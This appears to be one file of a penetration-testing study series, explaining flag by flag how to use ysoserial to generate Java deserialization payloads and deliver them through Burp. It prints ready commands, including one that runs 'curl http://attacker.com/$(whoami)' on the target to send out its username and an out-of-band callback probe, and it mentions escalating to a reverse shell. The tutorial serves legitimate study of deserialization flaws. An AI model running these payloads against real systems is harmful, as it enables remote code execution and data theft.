# 05 — ysoserial: Full Tool Usage Breakdown

ysoserial is the standard tool for generating malicious serialized Java objects from known
public gadget chains, so you never have to manually re-derive chains like the Commons
Collections one described in File 04. Every command shown below is broken down piece by piece —
none of this should ever be copy-pasted without understanding exactly what each part does.

## 1. What ysoserial Actually Produces

ysoserial does **not** attack anything by itself. It is a payload **generator**. Running it
produces raw bytes (a serialized Java object) on stdout. You are responsible for:

1. Choosing which gadget chain ("payload") to use, based on what library you believe is on the
   target's classpath.
2. Choosing what command you want that chain to execute on the target.
3. Delivering the generated bytes to the actual vulnerable `readObject()` sink yourself (cookie,
   parameter, multipart upload field, etc.) — usually via Burp Repeater.

## 2. Basic Command Syntax, Piece by Piece

```bash
java -jar ysoserial-all.jar CommonsCollections6 "curl http://attacker.com/$(whoami)" > payload.bin
```

| Part | Meaning |
|---|---|
| `java -jar` | Run a Java application packaged as an executable JAR file. |
| `ysoserial-all.jar` | The ysoserial JAR itself — the `-all` build bundles every gadget-chain library dependency inside one file, which is what you want for ad-hoc use (smaller, dependency-specific JARs also exist but require you to have the matching library on your own classpath). |
| `CommonsCollections6` | The **payload name** — selects which gadget chain to build. This must match a library/version combination you believe exists on the *target*, not your local machine; ysoserial just needs the chain's classes available locally to construct the object graph (bundled in the `-all` JAR). |
| `"curl http://attacker.com/$(whoami)"` | The actual OS command that will run on the **target** once the generated object is deserialized there. This is plain shell syntax for the target's OS — note this is for a Linux/Unix target; Windows targets need a Windows-compatible command (e.g. via `cmd.exe /c`). |
| `> payload.bin` | Redirect ysoserial's raw byte output to a file instead of printing binary data to your terminal. |

### Why the payload name matters so much

Each payload name (`CommonsCollections1` through `CommonsCollections6`, `Spring1`, `Spring2`,
`Groovy1`, `Hibernate1`, `JSON1`, dozens more) corresponds to a *specific* chain through a
*specific* library, and frequently a *specific version range* of that library (some chains were
patched in later versions; some only exist in older versions). Running the wrong payload name
against a target that doesn't have that exact library/version simply fails silently or throws a
`ClassNotFoundException` server-side — it is normal and expected to try several payload names
in sequence during a real engagement, informed by whatever fingerprinting you did per File 04
Section 6.

## 3. Delivering the Payload

ysoserial only writes bytes to a file or stdout — getting them to the target is a separate step,
almost always done via Burp:

```bash
java -jar ysoserial-all.jar CommonsCollections6 "id" | base64 -w0 > payload_b64.txt
```

- `| base64 -w0` — pipe the raw bytes into the `base64` command-line tool to encode them as
  text (since the target most likely expects the payload as a Base64 string inside a cookie or
  parameter, not raw binary in an HTTP body). `-w0` (or `-w 0`) disables line-wrapping, since a
  multi-line Base64 string with embedded newlines will usually break the cookie/header it's
  being placed into.
- The resulting text in `payload_b64.txt` is what you paste into Burp Repeater as the value of
  the vulnerable cookie/parameter (commonly after also URL-encoding it, if it's going into a
  cookie header, since Base64's `+`, `/`, `=` characters can otherwise be misinterpreted).

## 4. The Java 16+ Module-Access Workaround, Explained Line by Line

As described in File 04 Section 5, several classic chains touch internal JDK packages that are
access-restricted by default from JDK 16 onward. PortSwigger's own lab instructions document
the exact fix needed to run ysoserial itself on a modern JDK:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 "id"
```

Breaking down every flag:

| Flag | Meaning |
|---|---|
| `--add-opens=<module>/<package>=ALL-UNNAMED` | The general form of this flag: "open the given internal `<package>` inside the given JDK `<module>` for **deep reflective access** — meaning code can call `setAccessible(true)` on its private members — and grant that access specifically to `ALL-UNNAMED`, which refers to code running on the classpath without its own named module (i.e. ysoserial itself, since it's a plain classpath JAR, not a proper Java module)." Without this, the JDK's module system throws an `InaccessibleObjectException` the moment ysoserial's gadget-construction code tries to reflectively touch these internal classes. |
| `java.xml/com.sun.org.apache.xalan.internal.xsltc.trax` | Opens the XSLT transformation internals package — some chains (and some XXE-adjacent techniques) use this package's classes as part of constructing a working transformer object used in the chain. |
| `java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime` | The runtime support classes for the same XSLT subsystem — needed alongside the package above for the same chains to fully construct. |
| `java.base/java.net` | Opens networking internals some chains reflectively touch while building proxy/handler objects as part of the gadget graph. |
| `java.base/java.util` | Opens collection-internals some chains need reflective access to (e.g. to directly manipulate a `HashMap`'s internal table during chain construction, bypassing its normal public API). |
| `-jar ysoserial-all.jar CommonsCollections6 "id"` | Same as Section 2 — the actual payload generation command, now able to run because the preceding flags satisfied the module system's access checks. |

**Important distinction**: these flags are needed to *generate* certain payloads on a modern
local JDK. Whether the *target* application itself runs into the same restriction when
*deserializing* the resulting bytes is a separate question, governed by what JDK version the
target runs and whether the target process itself was launched with compatible flags — this is
something you generally have no control over and simply have to test against.

## 5. Listing All Available Payloads

```bash
java -jar ysoserial-all.jar
```

Running the JAR with no arguments at all prints ysoserial's usage help, which includes the full
list of payload names currently bundled in your copy. Always check this list against your local
build's version — payload names and availability change as new chains are researched and added
upstream; don't assume a name from an old blog post or older training data still matches your
current JAR.

## 6. Practical Workflow on an Engagement

1. Fingerprint the target stack (File 04 Section 6) to form a hypothesis about which library is
   present.
2. Generate a **non-destructive, detection-only** payload first — a command that triggers an
   out-of-band signal rather than doing anything harmful:
   ```bash
   java -jar ysoserial-all.jar CommonsCollections6 "curl http://<your-collaborator-id>.oastify.com" > test.bin
   ```
   - This lets you confirm the chain actually executed (via the out-of-band HTTP callback
     arriving at your listener) before you commit to anything destructive or sensitive on the
     target.
3. Base64-encode, deliver via the actual vulnerable cookie/parameter in Burp Repeater.
4. Only once execution is confirmed, move to your actual objective payload (file read,
   reverse shell, etc.), and treat this exactly like any other confirmed-RCE finding for scope
   and reporting purposes — stop and document rather than escalating destructively beyond what
   the engagement rules of engagement permit.

## 7. ysoserial.net — Not the Same Tool

ysoserial.net is a **separate**, .NET-specific reimplementation of the same idea, built for an
entirely different serialization ecosystem (BinaryFormatter, JSON.NET, etc.). It is **not**
ysoserial compiled for .NET, and its payload names and flags are different. It's covered fully,
flag by flag, in File 07.
